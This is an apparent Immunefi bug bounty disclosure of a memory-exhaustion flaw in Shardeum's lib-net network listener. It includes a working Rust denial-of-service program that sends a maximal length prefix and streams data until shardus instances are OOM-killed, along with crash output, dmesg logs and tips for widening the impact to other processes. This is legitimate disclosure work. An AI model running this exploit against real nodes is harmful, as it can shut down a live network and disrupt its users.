# 34093 - \[BC - Critical] lib-net can be used to force oom reap of shardu...

## lib-net: can be used to force oom reap of shardus instances

Submitted on Aug 5th 2024 at 18:58:30 UTC by @riproprip for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34093

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

### Description

### Brief/Intro

Disclosure: Wasn't sure on the severity level / impact you would want to classify this as.

Bug can be used to crash `shardus-instances`.

If used intelligently can be used to sometimes crash all the instances (without them getting restarted). Used even more complicated: Can be used to crash other processes in the OS.

I would find that to be severe ...

### Vulnerability Details

<https://github.com/shardeum/lib-net/blob/2832f1d4c92a3efb455239f146567f21fd80e4cb/shardus\\_net/src/shardus\\_net\\_listener.rs#L95> allows attacker controlled allocations on the system.

On some OS that already triggers the crash.

On other OS those allocations themselves usually get delayed. But once we actually read in data in L106, the allocator has to pull in more pages till the oom reaper gets triggered.

What the oom reaper does and when exactly it gets triggered is again highly dependent on the physical configuration of the box and the OS. It is however always a kill of a system process.

Different tested configs:

* On a box with 1gb of physical ram I have seen crashes after sending 2512kb of data. Those crashes however couldn't reliably reap the restarting processes that "shardus start" apparently runs in the background. So that process starts a new shardus intstance. With more tinkering it's likely possible however to reap the restart process also.
* On a box with 8gb of ram I have seen crashes after sending much closer to 8gb of data. Sending data in parallel to multiple instances (in theory) reduces the complete amount of bytes that need to be send. (Again depends on the allocation algorithms used be the OS). Notably those crashes reliably reap the "restart" (I think you call it pm?) process on my linode box, leaving no shardus-instance running.
* To widen the impact: In theory one could allocate close to the maximum amount of ram on the system and wait till any other process on the system allocates ram. That one would somewhat likely get reaped on modern linux systems. (Not a Mac guy ...)

If somebody brings up the amount of traffic when wanting to downgrade this bug: I saw references to Gzip and Brotli. Both are extremely efficient at compressing repeating patterns. For reference compression rates on the older Gzip:

* 1Gb is 1MB in traffic
* 14GB is 7MB in traffic
* 64Gb is \~64 MB in traffic

### Proof of concept

## Simple POC

I have 2 POC. The simpler one shows that javascript using `lib-net` can't recover from the allocation problems. The error does not bubble up to javascript to handle. The process just dies.

Please note that the server output of `memory allocation of 4294967295 bytes failed` does represent the actual amount of data sent. It's just the requested allocation the kernel finally has to fulfill after receiving `~2512kb` of data.

Before you make me document the more complicated one doing the "oom reaper thing to shardeum and the instances" please keep in mind that your process.on('SIGINT|SIGTERM') handlers all just die.

You can however use the net\_attack code against your `shardus start N` instances. Depending on your configuration, different things will happen like explained above. I am happy to go into detail howto maximize impact.

### server

#### save as test.js

```
const port = 10001
const address = 'localhost'

let sn = require('.').Sn;
sn = sn({ 
        port, 
        address, 
        crypto: {
                hashKey: '69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc',
                signingSecretKeyHex: 'b66bc8e10b4c5afbb0ba825eb46e4798269e9e960e6fd668cec6a9a7b1d11f186003e6dc8d3f3b364b9ea6d7eb6489b99139ca41919cae70813017d56db3140c',
        }
});

async function main() {
        try {
                const server = await sn.listen((data, remote, protocol, respond) => {
                        console.log('LISTEN GOT');
                        console.log(data);
                        console.log(remote);
                        console.log(protocol);
                        console.log(respond);

                })
        }
        catch (e) {
                console.log('CAUGHT IN MAIN', e);
        }
}
try {
main();
} catch(e) {
        console.log('CAUGHT CLOSER TO EVENT LOOP', e);
}
```

#### run

```
git clone https://github.com/shardeum/lib-net.git; 
npm run build
node test.js
```

#### attacker

**run**

```
cargo new net_attack
cd net_attack
echo 'tokio = { version = "1.39.2", features = ["full"] }' >> Cargo.toml
```

#### save as src/main.rs

```
use std::io::Write;
use std::net::TcpStream;
use tokio::time::{sleep, Duration};

#[tokio::main(flavor = "multi_thread", worker_threads = 10)]
async fn main() {
    // Connect to a TCP server running on localhost at port 8080
    let mut handles = vec![];
    // for i in 10001..10010 {
    for i in 10000..10006 {
        let conn = format!("localhost:{}",i);

        let handle = tokio::spawn(async move {
            if let Ok(mut stream) = TcpStream::connect(conn.clone()) {
                println!("working on {}", conn.clone());
        
                // send length
                let u32_data: u32 = u32::MAX;
                stream.write_all(&u32_data.to_be_bytes()).unwrap();
        
        
                // 1kb data
                let u8_data = vec![0; 1024];
        
                // send 4g 
                let mut kb_send = 0;
                for i in 0.. (1024*1024*4)  {
                    let ret = stream.write_all(&u8_data);
                    match ret {
                        Ok(_) => { kb_send += 1; }
                        _ => {}
                    }

                    // if i % 2513 == 0 {
                    //     println!("waiting");
                    //     sleep(Duration::from_secs(5)).await;
                    // }
                }
                println!("{} took {} kb of data to explode the server", conn, kb_send);
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.await.unwrap();
    }
```

#### run

```
cargo build
```

### output

#### server

```
node test.js # now wait for attacker to run
memory allocation of 4294967295 bytes failed
Aborted (core dumped)
```

#### attacker

```
(cmd)root@localhost:~/net_attack# ps -ef | grep "node"
root      622235  619278  0 12:07 pts/4    00:00:00 node test.js
root      622426  565054  0 12:07 pts/3    00:00:00 grep --color=auto node
(ins)root@localhost:~/net_attack# pstree -p 622235
node(622235)─┬─{node}(622236)
             ├─{node}(622237)
             ├─{node}(622238)
             ├─{node}(622239)
             ├─{node}(622240)
             ├─{node}(622241)
             └─{node}(622242)
(ins)root@localhost:~/net_attack# ./target/debug/net_attack 
working on localhost:10000
localhost:10000 took 2512 kb of data to explode the server
(cmd)root@localhost:~/net_attack# pstree -p 622235
(ins)root@localhost:~/net_attack# ps -ef | grep "622235"
root      622446  565054  0 12:08 pts/3    00:00:00 grep --color=auto 622235
```

#### dmesg

```
[25332975.711693] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/user.slice/user-0.slice/session-51052.scope,task=npm ci,pid=561123,uid=0
[25332975.711736] Out of memory: Killed process 561123 (npm ci) total-vm:1456584kB, anon-rss:311600kB, file-rss:128kB, shmem-rss:0kB, UID:0 pgtables:4316kB oom_score_adj:0
[25333014.835316] Adding 2097148k swap on /swapfile2g.  Priority:-3 extents:22 across:20447200k SSFS          
[25333464.439782] systemd-journald[3612200]: Failed to create new system journal: No space left on device     
[25333464.482234] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333464.490041] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333464.496164] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333524.489081] systemd-journald[3612200]: Failed to open system journal: No space left on device (Dropped 9647 similar message(s))
[25333524.495573] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333524.502151] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333584.492651] systemd-journald[3612200]: Failed to open system journal: No space left on device (Dropped 9134 similar message(s))
[25333584.498730] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25333584.505062] systemd-journald[3612200]: Failed to open system journal: No space left on device           
[25334123.930224] __vm_enough_memory: pid: 618969, comm: tokio-runtime-w, not enough memory for the allocation
[25334123.930622] __vm_enough_memory: pid: 618969, comm: tokio-runtime-w, not enough memory for the allocation
[25334123.930744] __vm_enough_memory: pid: 618969, comm: tokio-runtime-w, not enough memory for the allocation
[25334139.556115] __vm_enough_memory: pid: 619106, comm: tokio-runtime-w, not enough memory for the allocation
```
